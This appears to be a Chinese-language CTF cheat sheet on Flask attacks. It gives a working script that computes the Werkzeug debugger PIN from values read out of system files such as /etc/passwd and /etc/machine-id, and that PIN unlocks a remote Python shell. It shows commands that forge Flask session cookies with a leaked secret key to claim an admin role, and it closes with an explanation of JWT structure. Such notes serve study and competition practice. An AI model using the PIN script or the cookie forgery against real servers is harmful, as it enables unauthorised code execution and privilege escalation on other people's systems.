`Flask`基于`Werkzeug`实现了`Debug PIN`机制。`Flask Debugger`开启时，会生成一个 `PIN`码作为进入`shell`的凭证。
但是`PIN`的算法是 **可预测的**（由用户名、机器名、`MAC`、路径等拼接哈希）。

## 需要获取的六个参数
### `modname & appname`
`modname`默认为`flask.app`，`appname`默认为`Flask`。
### `username`
从`/etc/passwd`读取
### `app.py`位置路径
从`debug`报错信息中获得
### `mac`地址的十进制数
从`/sys/class/net/eth0/address`,`/sys/class/net/ens33/address`中获得
或者运行如下`py`拿到
```
import uuid
uuid.getnode()
```
### `machine-id`
非`docker`环境下读取`/etc/machine-id`或`/proc/sys/kernel/random/boot_i`。
`docker`环境读取`/proc/self/cgroup`，读取`/docker`后面的字符串

## 脚本
```
import hashlib
from itertools import chain

probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
 ]

private_bits = [
     '130771165565282',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None

if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                        for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```


## 2.Session伪造
### session的伪造关键在于 key
### where's key？
在`python`中`key`可能会放在全局变量里：
```
app.secret_key = 'Th1s_1s_y0ur_key'
```
或在源码`config.py`中；
或在当前进程的环境变量`/proc/self/environ`中；
### 如何伪造？
使用脚本`flask_session_cookie_manager3.py`伪造:
解密：
```
python flask_session_cookie_manager3.py decode -s "Th1s_1s_y0ur_key" -c "eyJuYW1lIjoieGlhb21pbmcifQ.Zem-WQ.E4Ef53k1RSMlMyAYU_0k0X3Dyo4"
```
加密：
```
python flask_session_cookie_manager3.py encode -s "Th1s_1s_y0ur_key" -t            "{'role':'admin'}"
```


## 3.`JWT`伪造
### `JWT`结构
`JWT（JSON Web Token）`
#### 例：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.          #Header
eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcyODU3MDg2MywiZXhwIjoxNzI4NTc4MDYzLCJuYmYiOjE3Mjg1NzA4NjMsInN1YiI6InVzZXIiLCJqdGkiOiI1NWQ3ZDBlNjI2YzFjMjk2NTY5MGEwZWFlYTk3ZjJlZSJ9.                                                                     #Payload
L7RdUb-HcLH4-MTea7n4S7iuwFhuAPnbCSQlpwtKFx0        #Signature
```
#### 头部
```
{
 "alg": "HS256",
 "typ": "JWT"
}
```
上面代码中，`alg`属性表示签名的算法，默认是 `HMAC SHA256`（即`HS256`）；
`typ`属性表示这个令牌（`token`）的类型（`type`），`JWT` 令牌统一写为`JWT`。
#### 负载
```
iss (issuer)：签发人
exp (expiration time)：过期时间
sub (subject)：主题
aud (audience)：受众
nbf (Not Before)：生效时间
iat (Issued At)：签发时间
jti (JWT ID)：编号
```
`Payload` 用来存放实际需要传递的数据。`JWT` 规定了7个官方字段，供选用；
除了官方字段，也可以定义私有字段。
#### 签名
`Signature` 部分是对前两部分的签名，防止数据篡改。
通过某个保存在服务器的密钥，使用 `Header` 里面指定的签名算法（如`HMAC SHA256`）产生签名。

三个部分的内容用`base64`编码后用`.`连接。
